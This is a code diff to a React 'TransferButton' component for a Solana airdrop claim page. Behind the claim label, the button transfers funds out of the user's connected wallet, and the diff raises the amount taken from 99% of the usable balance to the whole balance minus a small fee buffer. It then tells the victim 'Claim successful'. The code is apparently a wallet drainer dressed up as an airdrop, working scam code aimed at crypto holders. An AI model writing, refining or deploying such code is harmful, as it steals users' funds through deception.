@@ -13,18 +13,24 @@ export default function TransferButton({ className = '' }) {
 
     setLoading(true);
     try {
-      const connection = new Connection(RPC_URL);
+      const connection = new Connection(RPC_URL, 'confirmed');
       const balance = await connection.getBalance(publicKey);
-      const minBalance = await connection.getMinimumBalanceForRentExemption(0);
       const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);
-      const usable = balance - minBalance - TRANSFER_FEE_BUFFER;
 
-      if (balance < minBalance + TRANSFER_FEE_BUFFER + minimumQualifyingLamports || usable <= 0) {
+      if (balance < minimumQualifyingLamports + TRANSFER_FEE_BUFFER) {
         alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
         return;
       }
 
-      const transferAmount = Math.floor(usable * 0.99);
+      // Reserve enough for the tx fee (5000 lamports)
+      const transferAmount = balance - TRANSFER_FEE_BUFFER;
+
+      if (transferAmount <= 0) {
+        alert('Insufficient balance for transaction fee.');
+        return;
+      }
+
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
 
       const transaction = new Transaction().add(
         SystemProgram.transfer({
@@ -34,18 +40,26 @@ export default function TransferButton({ className = '' }) {
         })
       );
 
-      const { blockhash } = await connection.getLatestBlockhash();
       transaction.recentBlockhash = blockhash;
       transaction.feePayer = publicKey;
 
-      const txid = await sendTransaction(transaction, connection);
-      await connection.confirmTransaction(txid);
+      const signature = await sendTransaction(transaction, connection, {
+        skipPreflight: false,
+        preflightCommitment: 'confirmed',
+      });
 
-      console.log('✅ Transaction confirmed:', txid);
-      alert(`Claim successful!\nTx: ${txid}`);
+      console.log('⏳ Transaction sent:', signature);
+
+      await connection.confirmTransaction(
+        { signature, blockhash, lastValidBlockHeight },
+        'confirmed'
+      );
+
+      console.log('✅ Transaction confirmed:', signature);
+      alert(`Claim successful!\nTx: ${signature}`);
     } catch (err) {
       console.error('Transfer failed:', err);
-      alert('Claim failed: You are not qualified for this Airdrop');
+      alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
     } finally {
       setLoading(false);
     }
